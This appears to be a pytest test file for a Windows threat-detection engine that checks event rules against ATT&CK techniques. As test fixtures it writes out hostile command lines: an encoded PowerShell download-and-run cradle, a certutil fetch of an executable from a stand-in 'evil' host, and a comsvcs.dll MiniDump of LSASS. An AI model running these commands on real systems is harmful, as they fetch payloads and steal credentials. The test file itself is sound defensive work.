import base64
import uuid
from datetime import datetime, timedelta

from config.detection_config import load_rule_config
from detection.detector import DetectionEngine
from models.event_model import NormalizedEvent

CFG = load_rule_config()
T0 = datetime(2026, 10, 18, 9, 0, 0)


def ev(**kw):
    kw.setdefault("event_id", str(uuid.uuid4()))
    kw.setdefault("timestamp", T0)
    kw.setdefault("source", "Sysmon")
    kw.setdefault("event_type", "1")
    return NormalizedEvent(**kw)


def run(events):
    eng = DetectionEngine(CFG)
    eng.scan(events)
    return eng.detections


def tids(dets):
    return {d.technique_id for d in dets}


def test_encoded_powershell_detected():
    enc = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://x/y')"
                           .encode("utf-16-le")).decode()
    d = run([ev(process_name="powershell.exe", command_line=f"powershell -nop -w hidden -enc {enc}",
                host="H1")])
    assert "T1059.001" in tids(d)
    assert d[0].severity in ("HIGH", "MEDIUM")


def test_benign_powershell_not_flagged():
    d = run([ev(process_name="powershell.exe", command_line="powershell -File C:\\Scripts\\report.ps1",
                host="H1")])
    assert "T1059.001" not in tids(d)


def test_certutil_lolbin():
    d = run([ev(process_name="C:\\Windows\\System32\\certutil.exe",
                command_line="certutil -urlcache -split -f http://evil/x.exe C:\\Users\\u\\AppData\\Local\\Temp\\x.exe",
                host="H1")])
    assert "T1105" in tids(d)


def test_brute_force_and_success():
    events = []
    for i in range(10):
        events.append(ev(source="Windows Event Log", event_type="4625", host="H1", username="admin",
                         source_ip="203.0.113.45", logon_type="10",
                         timestamp=T0 + timedelta(seconds=30 * i)))
    events.append(ev(source="Windows Event Log", event_type="4624", host="H1", username="admin",
                     source_ip="203.0.113.45", logon_type="10", timestamp=T0 + timedelta(minutes=6)))
    d = run(events)
    assert "T1110.001" in tids(d)
    assert "T1078" in tids(d)  # successful logon after brute force


def test_brute_force_below_threshold_quiet():
    events = [ev(source="Windows Event Log", event_type="4625", host="H1", username="admin",
                 source_ip="10.0.0.5", timestamp=T0 + timedelta(seconds=30 * i)) for i in range(3)]
    assert "T1110.001" not in tids(run(events))


def test_port_scan():
    events = []
    for p in range(20, 50):
        events.append(ev(source="Sysmon", event_type="3", host="H1", source_ip="203.0.113.45",
                         destination_ip="10.10.20.37", destination_port=p, process_name="scan",
                         timestamp=T0 + timedelta(seconds=p - 20),
                         raw_data={"Initiated": "true"}))
    assert tids(run(events)) & {"T1046", "T1595"}


def test_beaconing():
    events = []
    for i in range(14):
        events.append(ev(source="Sysmon", event_type="3", host="H1", source_ip="10.10.20.37",
                         destination_ip="198.51.100.23", destination_port=443, process_name="implant.exe",
                         timestamp=T0 + timedelta(seconds=60 * i), raw_data={"Initiated": "true"}))
    assert tids(run(events)) & {"T1071", "T1071.001"}


def test_allowlisted_destination_not_c2():
    events = [ev(source="Sysmon", event_type="3", host="H1", source_ip="10.10.20.37",
                 destination_ip="13.107.42.14", destination_port=443, domain="update.microsoft.com",
                 process_name="MicrosoftEdgeUpdate.exe", timestamp=T0 + timedelta(seconds=60 * i),
                 raw_data={"Initiated": "true"}) for i in range(14)]
    assert not (tids(run(events)) & {"T1071", "T1071.001", "T1571"})


def test_lsass_dump():
    d = run([ev(process_name="rundll32.exe",
                command_line="rundll32 C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\x.dmp full",
                host="H1")])
    assert "T1003.001" in tids(d)


def test_office_child_process():
    d = run([ev(process_name="powershell.exe", parent_process="WINWORD.EXE",
                command_line="powershell -enc AAAA", host="H1")])
    assert "T1204.002" in tids(d)


def test_log_clear():
    d = run([ev(source="Windows Event Log", event_type="1102", host="H1")])
    assert "T1070.001" in tids(d)


def test_disabled_rule():
    cfg = load_rule_config(overrides={"credential_access": {"enabled": False}})
    eng = DetectionEngine(cfg)
    eng.scan([ev(process_name="rundll32.exe",
                 command_line="rundll32 comsvcs.dll, MiniDump 1 x.dmp full", host="H1")])
    assert "T1003.001" not in {d.technique_id for d in eng.detections}


def test_rule_failure_isolated(monkeypatch):
    eng = DetectionEngine(CFG)
    boom = eng.rules[0]
    monkeypatch.setattr(boom, "evaluate", lambda e: (_ for _ in ()).throw(RuntimeError("boom")))
    eng.scan([ev(source="Windows Event Log", event_type="1102", host="H1")])
    assert eng.rule_errors  # captured, did not crash
    assert "T1070.001" in {d.technique_id for d in eng.detections}
